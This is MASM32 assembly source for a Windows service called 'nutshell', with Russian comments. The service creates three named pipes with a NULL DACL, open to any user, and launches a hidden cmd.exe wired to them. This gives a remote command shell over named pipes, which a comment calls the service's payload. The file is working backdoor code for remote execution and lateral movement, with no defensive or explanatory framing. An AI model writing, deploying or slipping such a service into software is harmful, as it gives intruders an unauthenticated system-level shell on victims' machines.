.686
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc
include \masm32\include\user32.inc
include \masm32\include\masm32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\masm32.lib

include     \masm32\include\msvcrt.inc
includelib \masm32\lib\msvcrt.lib

; Прототипы  ===============================================

ServiceStart	PROTO :DWORD,:DWORD
ServiceCtrlHandler	PROTO :DWORD
ServiceThread 	PROTO 
memset		PROTO c:DWORD,:DWORD,:DWORD

m2m MACRO	dest, src
	mov	eax, src
	mov	dest, eax
ENDM
.const
	TWAIT	equ	1000*60*3	

; Инициализированные данные ======================================
.data

; Имя сервиса
SERVICE_NAME 	BYTE "nutshell", 0
ERROR_MESSAGE 	BYTE "In StartServiceCtrlDispatcher", 0

; Флаги показывающие состояние сервиса
fPaused		BOOL FALSE
fRunning		BOOL FALSE

sznutshell_stdout	db 'nutshell_stdout',0
sznutshell_stdin	db 'nutshell_stdin',0
sznutshell_stderr	db 'nutshell_stderr',0



.data?
hStdOut	HANDLE ?
hStdIn	HANDLE ?
hStdErr	HANDLE ?


serviceStatus SERVICE_STATUS	<>

; Поток с полезной нагрузкой
hStatus		DWORD ?
sTable		SERVICE_TABLE_ENTRY <>
hThread		HANDLE ?
evTerminate	HANDLE ?

   
; Реализация ========================================
.code
;========================================================
;========================================================
; Рабочая функция сервиса
; 
;
.data
	szPipePath	db '\\.\pipe\%s',0
	szCMD		db 'cmd.exe',0

.code
ServiceThread Proc
local lpszStdOut[MAX_PATH]:BYTE
local lpszStdIn[MAX_PATH]:BYTE
local lpszStdErr[MAX_PATH]:BYTE
local sa: SECURITY_ATTRIBUTES
local sd: SECURITY_DESCRIPTOR
local sinfo:STARTUPINFO
local pi:PROCESS_INFORMATION
local dwStatus:DWORD



	invoke	memset, addr lpszStdOut, 0, MAX_PATH
	invoke	memset, addr lpszStdIn,  0, MAX_PATH
	invoke	memset, addr lpszStdErr, 0, MAX_PATH
	invoke	memset, addr sa, 0, sizeof SECURITY_ATTRIBUTES
	invoke	memset, addr sd, 0, sizeof SECURITY_DESCRIPTOR
	invoke	InitializeSecurityDescriptor, addr sd, \
				SECURITY_DESCRIPTOR_REVISION
	invoke	SetSecurityDescriptorDacl, addr sd, \
				TRUE, NULL, FALSE

	lea	edi,sd
	mov	sa.lpSecurityDescriptor, edi
	mov	sa.nLength, sizeof SECURITY_ATTRIBUTES
	mov	sa.bInheritHandle, TRUE


	invoke	wsprintf, addr lpszStdOut, addr szPipePath,\
					addr sznutshell_stdout

	invoke	wsprintf, addr lpszStdIn, addr szPipePath,\
					addr sznutshell_stdin

	invoke	wsprintf, addr lpszStdErr, addr szPipePath,\
					addr sznutshell_stderr




	invoke	CreateNamedPipe, addr lpszStdOut, PIPE_ACCESS_OUTBOUND, \
			PIPE_TYPE_MESSAGE OR PIPE_WAIT, \
			PIPE_UNLIMITED_INSTANCES, \
			0, 0, -1, addr sa

	mov	hStdOut,eax
	invoke	CreateNamedPipe, addr lpszStdIn, PIPE_ACCESS_INBOUND,  \
			PIPE_TYPE_MESSAGE OR PIPE_WAIT, \
			PIPE_UNLIMITED_INSTANCES, \
			0, 0, -1, addr sa

	mov	hStdIn,eax
	invoke	CreateNamedPipe, addr lpszStdErr, PIPE_ACCESS_OUTBOUND, \
			PIPE_TYPE_MESSAGE OR PIPE_WAIT, \
			PIPE_UNLIMITED_INSTANCES, \
			0, 0, -1, addr sa
	mov	hStdErr,eax

	.if	( hStdOut == INVALID_HANDLE_VALUE )|| \
		( hStdIn  == INVALID_HANDLE_VALUE )|| \
		( hStdErr == INVALID_HANDLE_VALUE )

		invoke	CloseHandle, hStdOut
		invoke	CloseHandle, hStdIn
		invoke	CloseHandle, hStdErr
		xor	eax,eax
		ret
	.endif

	invoke	ConnectNamedPipe, hStdOut, NULL
	invoke	ConnectNamedPipe, hStdIn,  NULL
	invoke	ConnectNamedPipe, hStdErr, NULL

	invoke	memset, addr sinfo, 0, sizeof STARTUPINFO
	m2m	sinfo.cb, sizeof STARTUPINFO 
	m2m	sinfo.dwFlags, STARTF_USESTDHANDLES
	m2m	sinfo.hStdOutput, hStdOut
	m2m	sinfo.hStdInput, hStdIn
	m2m	sinfo.hStdError, hStdErr

	invoke	CreateProcess, NULL, addr szCMD, \
				NULL, NULL, \
				TRUE, CREATE_NO_WINDOW, \
				NULL, NULL, \
				addr sinfo, \
				addr pi

	.if	( eax )
		mov	eax, STILL_ACTIVE
		mov	dwStatus, eax

		invoke	Sleep, 100	
		xor	eax, eax
	__wait:
			invoke	WaitForSingleObject, evTerminate, 10
			cmp	eax, WAIT_OBJECT_0
			je	__exit	
			push	eax	

			invoke	GetExitCodeProcess, pi.hProcess, addr dwStatus
			mov	ecx, dwStatus
			.if	ecx != STILL_ACTIVE
				jne	__exit
			.endif

			pop	eax
			jmp	__wait
	__exit:
		invoke	TerminateProcess, pi.hProcess, 0;
	.endif



	invoke	CloseHandle, hStdOut
	invoke	CloseHandle, hStdIn
	invoke	CloseHandle, hStdErr

	m2m	serviceStatus.dwCurrentState, SERVICE_STOPPED
	invoke	SetServiceStatus, hStatus, addr serviceStatus
	xor	eax,eax
	ret
ServiceThread EndP
;========================================================
; Обработка сообщений полученных от 
; service control manager (SCM)
ServiceCtrlHandler Proc controlCode:DWORD
LOCAL success:BOOL
	mov eax, controlCode

	.if ( eax == SERVICE_CONTROL_STOP )
		; Это для запуска ServiceMain()
		invoke	SetEvent, evTerminate
		m2m	serviceStatus.dwCurrentState, SERVICE_STOPPED
	.endif
	invoke	SetServiceStatus, hStatus, addr serviceStatus

	ret
ServiceCtrlHandler EndP
;========================================================
; ServiceMain делает к SCM запрос на обслуживание.
;
ServiceStart Proc argc:DWORD, argv:DWORD

	m2m	serviceStatus.dwServiceType, SERVICE_WIN32
	m2m	serviceStatus.dwCurrentState, SERVICE_START_PENDING
	m2m	serviceStatus.dwControlsAccepted, SERVICE_ACCEPT_STOP
	m2m	serviceStatus.dwWin32ExitCode, 0

	m2m	serviceStatus.dwServiceSpecificExitCode, 0
	m2m	serviceStatus.dwCheckPoint, 0
	m2m	serviceStatus.dwWaitHint, 0

	invoke	RegisterServiceCtrlHandler,addr SERVICE_NAME, offset ServiceCtrlHandler
	mov	hStatus, eax
	; Отправим SCM запрос на регистрацию
	m2m	serviceStatus.dwCurrentState,SERVICE_RUNNING
	invoke	SetServiceStatus, hStatus, addr serviceStatus

	; Создадим эвент для завершения потока
	;
	invoke	CreateEvent, NULL, FALSE, FALSE, NULL
	mov	evTerminate, eax

	; Запуск сервиса
	;
	invoke	CreateThread, NULL, 0, ServiceThread, 0, 0, NULL

	ret
ServiceStart EndP
;========================================================
Start:
; Регистрируемся у SCM
	mov	sTable.lpServiceProc, offset ServiceStart
	mov	sTable.lpServiceName, offset SERVICE_NAME
	invoke	StartServiceCtrlDispatcher, addr sTable
	ret

;========================================================
End Start